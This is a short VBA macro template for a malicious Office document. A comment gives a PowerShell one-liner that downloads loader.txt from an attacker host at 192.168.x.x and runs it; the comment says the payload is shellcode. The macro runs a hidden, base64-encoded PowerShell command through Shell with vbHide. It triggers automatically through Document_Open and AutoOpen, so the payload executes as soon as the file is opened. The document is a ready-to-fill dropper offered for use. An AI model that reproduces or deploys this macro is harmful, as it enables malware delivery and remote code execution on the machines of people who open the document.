' Use something like the following to base64 encode a command that downloads and runs shellcode (then copy and paste below):
' [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex((new-object system.net.webclient).downloadstring('http://192.168.x.x/loader.txt'))"))


Sub Populate()
    Dim str As String
    str = "powershell -enc <REPLACE ME WITH B64 ENCODED COMMAND>"
    Shell str, vbHide
End Sub

Sub Document_Open()
    Populate
End Sub

Sub AutoOpen()
    Populate
End Sub
